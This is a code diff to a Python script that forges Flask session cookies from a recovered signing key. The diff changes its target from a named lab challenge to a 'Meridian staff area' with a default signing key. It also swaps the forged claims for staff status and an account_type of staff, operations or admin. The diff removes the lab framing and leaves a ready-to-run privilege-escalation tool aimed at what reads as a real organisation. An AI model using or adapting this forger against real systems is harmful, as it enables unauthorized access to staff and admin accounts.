@@ -1,14 +1,14 @@
 #!/usr/bin/env python3
-"""Forge a Flask session cookie for challenge auth-weak-secret.
+"""Forge a Flask session cookie for the Meridian staff area.
 
 Pure standard library - no Flask or itsdangerous needed, so it runs against a
 containerised range from any host with Python 3.
 
 Equivalent to:
-  flask-unsign --sign --cookie "{'is_admin': True}" --secret 'deliberately-weak-lab-secret'
+  flask-unsign --sign --cookie "{'is_staff': True}" --secret 'meridian-default-signing-key'
 
 Usage:
-  python3 tools/forge_session.py --secret 'deliberately-weak-lab-secret'
+  python3 tools/forge_session.py --secret 'meridian-default-signing-key'
   python3 tools/forge_session.py --decode '<cookie value>'
 """
 
@@ -61,13 +61,14 @@ def decode(cookie: str) -> dict:
 parser = argparse.ArgumentParser(description=__doc__,
                                  formatter_class=argparse.RawDescriptionHelpFormatter)
 parser.add_argument("--secret", help="recovered Flask SECRET_KEY")
-parser.add_argument("--user", default="attacker", help="username to claim in the forged session")
+parser.add_argument("--account-type", default="operations",
+                    help="account_type claim to assert (staff, operations, admin)")
 parser.add_argument("--decode", metavar="COOKIE", help="print the contents of a session cookie")
 args = parser.parse_args()
 
 if args.decode:
     print(json.dumps(decode(args.decode), indent=2))
 elif args.secret:
-    print(sign({"is_admin": True, "user": args.user, "role": "admin"}, args.secret))
+    print(sign({"is_staff": True, "account_type": args.account_type}, args.secret))
 else:
     parser.error("pass --secret to sign a cookie, or --decode to read one")
